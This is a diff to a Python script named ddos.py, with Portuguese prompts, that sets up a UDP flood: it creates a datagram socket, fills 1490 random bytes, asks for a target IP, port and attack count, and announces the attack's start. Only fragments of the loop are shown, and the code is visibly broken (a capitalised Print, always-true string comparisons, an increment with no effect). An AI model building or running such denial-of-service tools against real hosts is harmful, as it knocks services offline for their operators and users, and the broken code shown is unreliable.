@@ -1,4 +1,3 @@
-GNU nano 6.2           ddos.py
 import socket
 import random
 import os
@@ -55,7 +54,7 @@ time.sleep(2)
 os.system("clear")
 time.sleep(1)
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRA>
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 IP = input("Digite o IP: ")
@@ -65,9 +64,10 @@ print("O IP e: ", IP)
 print("A Porta e: ", Porta)
 print("A quantidade de ataque e: ", Flood)
 
-if '1000' >= '1000':
-   print('OK, inicia ataque!')
+if '70000' >= '1000':
+ print('OK!')
 else:
+ Print('O ataque falhou!')
 
 os.system("figlet INICIANDO")
 time.sleep(5)
@@ -82,5 +82,3 @@ while C == 60000:
   C+1
 exit()
 print("FIM")
-
-   print('STOP')
